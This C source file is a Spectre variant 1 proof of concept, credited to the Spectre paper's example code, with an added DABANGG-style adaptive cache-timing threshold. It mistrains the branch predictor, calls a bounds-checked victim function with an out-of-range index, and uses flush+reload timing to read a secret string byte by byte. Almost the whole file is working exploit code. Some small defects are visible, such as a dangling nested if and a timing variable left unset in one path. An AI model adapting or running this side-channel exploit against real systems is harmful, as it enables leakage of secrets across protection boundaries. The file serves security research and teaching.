/*********************************************************************
*
* Spectre PoC
*
* This source code originates from the example code provided in the 
* "Spectre Attacks: Exploiting Speculative Execution" paper found at
* https://spectreattack.com/spectre.pdf
*
**********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include <sys/shm.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */

#define T_ARRAY_SIZE (2)

/* cache hit threshold for F+R */
int cache_hit_threshold = 90;

// Runtime variables, do not change initializations
uint64_t last_hit = 0;
uint64_t sequence = 0;
uint64_t potential_hit = 0;
uint64_t iter_no = 0;
uint64_t tl = 0;
uint64_t th = 0;
int DABANGG_flag = 0;

// Victim specific parameters, shouldn't need to change it 
uint64_t burst_gap = 10;

// Attack specific parameters, change it as per calibration results
uint64_t regular_gap = 10;
uint64_t step_width = 15000; 
uint64_t tl_array[T_ARRAY_SIZE] = {10, 50};
uint64_t th_array[T_ARRAY_SIZE] = {45, 100};

uint64_t measure_access_latency(volatile uint8_t* addr, unsigned int junk){
    register uint64_t time1, time2;
    _mm_mfence();
    _mm_lfence();
    time1 = __rdtsc(); /* READ TIMER */
    _mm_lfence();
    junk = * addr; /* MEMORY ACCESS TO TIME */
    _mm_mfence();
    _mm_lfence();
    time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
    _mm_lfence();
    return time2;
}

void compute_intensive_code(uint64_t sequence){
    long x, y;
    x = 5;
    y = 6;
    uint64_t wait_gap = regular_gap;
    if(sequence)	wait_gap = burst_gap;
    for (uint64_t i = 0; i < wait_gap; ++i){
        _mm_clflush(&wait_gap);
        x *= y;
        y *=x;
        if(i%7==0){
            x = y/5.2;
            y = x*0.81;
        }
        else if(i%17==0){
            x = y%13;
            y = x%6;
        }
        else{
            x = y/(x+1);
            y = 4*x/(3*y+7);
        }
    }
}

void verify_threshold(volatile uint8_t *addr, unsigned int junk){
    for(uint64_t i=0;i<10;i++){
        _mm_clflush(&i);
        i += (measure_access_latency(addr, junk)%2);
    }
    compute_intensive_code(0);
    
    register uint64_t delta = measure_access_latency(addr, junk);
    if(delta >= tl && delta <= th)
        ;
    else{
        uint64_t i;
        for(i = 0; i < T_ARRAY_SIZE; i++){
            if(delta >= tl_array[i] && delta <= th_array[i])
                break;
        }
        if(i >= 0 && i < T_ARRAY_SIZE){
            tl = tl_array[i];
            th = th_array[i];
            iter_no = step_width*i;
        }
        else{
            for(i = 0; i < T_ARRAY_SIZE; i++){
                if(delta >= tl_array[i])
                    break;
            }
            if(i >= 0 && i < T_ARRAY_SIZE){
                tl = tl_array[i];
                th = th_array[i];
                iter_no = step_width*i;
            }
            else{
                //printf("Oh no, delta doesn't reside inside any threshold pair! delta: %ld\n",delta);
                tl = tl_array[T_ARRAY_SIZE - 1];
                th = th_array[T_ARRAY_SIZE - 1];
                iter_no = step_width*(T_ARRAY_SIZE - 1);
            }
        }
        return;
    }   
}

_Bool attacker(volatile uint8_t * addr, unsigned int junk)
{
  _Bool isHit;
  iter_no++;
  tl = tl_array[(iter_no<(T_ARRAY_SIZE - 1)*step_width?iter_no:(T_ARRAY_SIZE - 1)*step_width)/step_width];
  th = th_array[(iter_no<(T_ARRAY_SIZE - 1)*step_width?iter_no:(T_ARRAY_SIZE - 1)*step_width)/step_width];

  // _mm_clflush(&addr);
  if(iter_no%100)
  if(iter_no%400 == 0){
      verify_threshold(addr, junk);
      // sched_yield();
  }
  else
  {
    compute_intensive_code(sequence);
  }
  uint64_t delta = measure_access_latency(addr, junk);

  if(delta >= tl && delta <= th)
  {
      isHit = 1;
  }
  else{
      isHit = 0;
  }

    return isHit;
}

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
  1,  2,  3,  4,  5,  6,  7,  8,
  9,  10,  11,  12,  13,  14,  15,  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char * secret = "HELP ME PLEASE. A MAN NEEDS HIS NUGGS....If only Bradley's arm was longer. Best photo ever. #oscars....Always in my heart @Harry_Styles . Yours sincerely, Louis";
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
Analysis code
********************************************************************/



/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t * addr;


  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush( & array1_size);
      for (volatile int z = 0; z < 100; z++) {}

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);

    }
    _Bool isHit;
    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * 512];

      if (DABANGG_flag)
      {
        isHit = attacker(addr, junk);
      }
      else
      {
        time2 = measure_access_latency(addr, junk);
      }
      if ((((int)time2 < cache_hit_threshold && !DABANGG_flag)|| (DABANGG_flag && isHit)) && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {

  /* Default for malicious_x is the secret string address */
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  
  int len = 160; 
  // int DABANGG_flag = 0;
  int score[2];
  uint8_t value[2];
  int i;

  #ifdef NOCLFLUSH
  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
    cache_flush_array[i] = 1;
  }
  #endif
  
  for (i = 0; i < (int)sizeof(array2); i++) {
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  }

  if (argc >= 2) {
    sscanf(argv[1], "%d", &DABANGG_flag);
  }

  char result[161];
  result[160] = 0;
  int iter = 0;

  /* Start the read loop to read each address */
  while (--len >= 0) {

    /* Call readMemoryByte with the required cache hit threshold and
       malicious x address. value and score are arrays that are
       populated with the results.
    */
    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

    result[iter] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
    iter++;
  }
  printf("%s\n",result);
  return (0);
}
